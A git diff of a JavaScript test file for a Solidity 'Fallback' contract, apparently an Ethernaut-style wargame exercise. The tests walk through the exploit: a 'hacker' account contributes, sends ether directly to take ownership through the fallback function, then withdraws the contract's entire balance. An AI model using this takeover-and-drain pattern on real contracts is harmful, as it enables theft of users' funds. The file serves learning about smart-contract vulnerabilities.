@@ -1,8 +1,8 @@
-import { O_WRONLY } from 'constants'
+const { expect } = require('chai')
 import { toEther, toWei, EVM_REVERT } from '../helpers'
 const Fallback = artifacts.require("Fallback")
 
-contract("Fallback", ([owner, acc1]) => {
+contract("Fallback", ([owner, hacker]) => {
     let fallback
     let contribution
     let deposit
@@ -20,10 +20,10 @@ contract("Fallback", ([owner, acc1]) => {
         })
         // owner contribution is deployed at by constructor
         it('confirms contract contribution', async () => {
-            let balance = toEther(await fallback.getContribution())
+            let balance = toEther(await fallback.getContribution({ from: owner }))
             assert.equal(balance.toString(),contribution.toString())
             
-            balance = await fallback.getContribution({from: acc1 });         
+            balance = await fallback.getContribution({from: hacker }); 
             assert.equal(balance.toString(), '0')
         })
     })
@@ -34,21 +34,25 @@ contract("Fallback", ([owner, acc1]) => {
             
          })
          // Non-owner makes a deposit, confirm contribution balance
-         it('allows a non-owner to make a deposit', async () => {
-             deposit = 100
-             await fallback.contribute({ from: acc1, value: deposit  })
-             let balance = toEther(await fallback.getContribution({from: acc1 }))
+         it('allows a non-owner to make a contribution', async () => {
+             deposit = 10 // 100 wei
+             await fallback.contribute({ from: hacker, value: deposit  })
+             let balance = toEther(await fallback.getContribution({from: hacker }))
              assert.equal(balance.toString(), toEther(deposit).toString())
         })
         // Non owner calls the fallback function and takes ownership of the contract
          it('Non owner sends Ether to the contract, confirms new owner', async () => {
-            await fallback.sendTransaction({ from: acc1, value: 2 })
-            assert.equal(await fallback.owner(), acc1)
+            await web3.eth.sendTransaction({from: hacker, to: fallback.address, value: web3.utils.toWei('0.001', 'ether')})
+            assert.equal(await fallback.owner(), hacker)
+        })
 
-            const acc1Balance = await fallback.getContribution({from: acc1 })
-            const ownerBalance = (toEther(await fallback.getContribution({from: owner })))
-            console.log(acc1Balance.toString())
-            console.log(ownerBalance.toString())
+        it('drains funds from contract', async () => {
+            let hackerBalance = await web3.eth.getBalance(hacker)
+            await fallback.withdraw({ from: hacker })
+            let newHackerBalance = await web3.eth.getBalance(hacker)
+            let contractBalance = await fallback.getBalance()
+            assert.equal(contractBalance.valueOf(), 0)
+            assert.notEqual(contractBalance,newHackerBalance)      
         })
 
     })
@@ -57,8 +61,3 @@ contract("Fallback", ([owner, acc1]) => {
 })
 
 
-// contract.sendTransaction({
-//     from: player,
-//     value: toWei(...)
-//   })
-  
